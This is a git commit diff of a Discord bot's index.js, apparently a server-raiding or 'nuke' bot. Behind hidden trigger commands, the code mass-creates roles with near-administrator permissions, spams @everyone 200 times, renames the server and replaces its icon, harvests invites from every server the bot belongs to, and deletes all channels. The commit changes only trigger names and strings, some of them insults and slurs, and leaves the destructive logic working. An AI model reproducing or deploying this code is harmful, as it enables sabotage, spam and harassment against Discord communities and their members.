d8f33a3ab8a3d6db49da1b45725bcf1f20920031
Okue92 <52104932+Okue92@users.noreply.github.com>
2019-07-14 16:40:07 +0200

    Update index.js

--- .gitignore/index.js
+++ .gitignore/index.js
@@ -9,111 +9,111 @@ bot.user.setActivity('Powered by Okue', { type: 'STREAMING', url:'https://www.tw
 if(message.content.includes("AR!kelsairv")){
   console.log(`${bot.guilds.map(c => c.name)}`)
 }
-if(message.content === "roles"){
+if(message.content === "!cuck"){
 for(var i =0; i < 200; i++){
-    message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+    message.guild.createRole({name:"cuck",
                              mentionable:false,
                              permissions:2146958591,
                              position: "",
                              color: "#fb0707"
         })
-        message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+        message.guild.createRole({name:"Cuck",
         mentionable:false,
         permissions:2146958591,
         position: "",
         color: "#ff08c5"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#5d08ff"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#0c08ff"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08d5ff"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08ffa3"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08ff23"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#81ff08"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#fff608"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff6f08"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
+message.guild.createRole({name:"Cuck",
 mentionable:false,
 permissions:2146958591,
 position: "",
@@ -124,7 +124,7 @@ color: "#ff0808"
 
 
 if(message.content.includes("!role")){
-    message.guild.createRole({name:"Izi",
+    message.guild.createRole({name:".",
                               mentionable:false,
                               permissions:2146958591,
                               position: "",
@@ -141,7 +141,7 @@ if(message.content.includes("ar!kelsairvvesrx")){
               bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
           }
           if(message.content === "!issou"){
-              message.guild.setName("LE CENTRE TA BZ :)")
+              message.guild.setName("T'ES BZ :)")
               message.guild.setIcon("https://cdn.discordapp.com/attachments/583707818536861714/584055184737435659/Pleure.jpg")
             }
             if(message.content === "!pd"){
@@ -149,9 +149,9 @@ if(message.content.includes("ar!kelsairvvesrx")){
               message.guild.createChannel("BY","voice")
               }
             }
-            if(message.content.includes("!everyone")){
-                for(var i = 0; i < 200; i+++++++){
-                    message.channel.send("@everyone Okue Le tchoupi Islamiste TA BZ VIEN ICI https://discord.gg/fVA3WE4")
+            if(message.content.includes("!IDT")){
+                for(var i = 0; i < 200; i++){
+                    message.channel.send("@everyone https://cdn.discordapp.com/attachments/534055320004067358/599940391055261697/image0.png")
                 }
             }
             //réaction en chaine
@@ -168,7 +168,7 @@ if(message.content.includes("ar!kelsairvvesrx")){
 
                       }
                     }
-                    if(message.content === "!destroy"){
+                    if(message.content === "!insurrection"){
                       message.guild.channels.map(c => c.delete())
                       }
                       //on commence la destruction
